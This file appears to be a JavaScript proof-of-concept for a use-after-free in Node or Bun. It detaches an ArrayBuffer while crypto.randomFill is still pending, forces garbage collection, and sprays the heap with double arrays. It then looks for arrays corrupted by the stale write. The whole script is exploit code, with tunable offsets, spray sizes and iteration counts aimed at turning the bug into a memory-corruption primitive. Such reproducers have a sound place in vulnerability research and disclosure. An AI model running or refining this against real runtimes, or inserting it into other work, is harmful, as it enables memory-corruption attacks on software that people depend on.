import { randomFill } from "node:crypto";

const iterations = Number(process.env.ITERATIONS || 64);
const size = Number(process.env.BUF_SIZE || 8192);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const slots = Number(process.env.SLOTS || 1024);
const writeOffset = Number(process.env.WRITE_OFFSET || 144);
const writeLength = Number(process.env.WRITE_LENGTH || 8);
const retained = [];

if (writeOffset < 0 || writeLength <= 0 || writeOffset + writeLength > size) {
  throw new Error("WRITE_OFFSET/WRITE_LENGTH must fit in BUF_SIZE");
}

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function allocateDoubleArrays() {
  const out = [];
  for (let i = 0; i < sprayCount; i++) {
    const arr = new Array(slots);
    for (let j = 0; j < slots; j++) arr[j] = 4000.75 + i + (j / 1024);
    out.push(arr);
  }
  return out;
}

function findChanged() {
  for (let i = 0; i < retained.length; i++) {
    const arr = retained[i];
    const expected = 4000.75 + i;
    if (!Object.is(arr[0], expected)) {
      return {
        arrayIndex: i,
        elementIndex: 0,
        expected,
        actual: arr[0],
        actualType: typeof arr[0],
      };
    }
  }
  return null;
}

async function runOne(iteration) {
  const ab = new ArrayBuffer(size);
  const target = new Uint8Array(ab);
  target.fill(0x51);

  const done = new Promise(resolve => {
    randomFill(target, writeOffset, writeLength, (err, buf) => {
      resolve({ err, byteLength: buf?.byteLength });
    });
  });

  detach(ab);
  gcNow();
  retained.length = 0;
  retained.push(...allocateDoubleArrays());
  gcNow();

  const result = await done;
  const changed = findChanged();
  console.log(JSON.stringify({
    iteration,
    size,
    sprayCount,
    slots,
    writeOffset,
    writeLength,
    callbackByteLength: result.byteLength,
    err: result.err?.message,
    changed,
  }));

  return Boolean(changed);
}

for (let i = 1; i <= iterations; i++) {
  if (await runOne(i)) {
    process.exitCode = 86;
    break;
  }
}
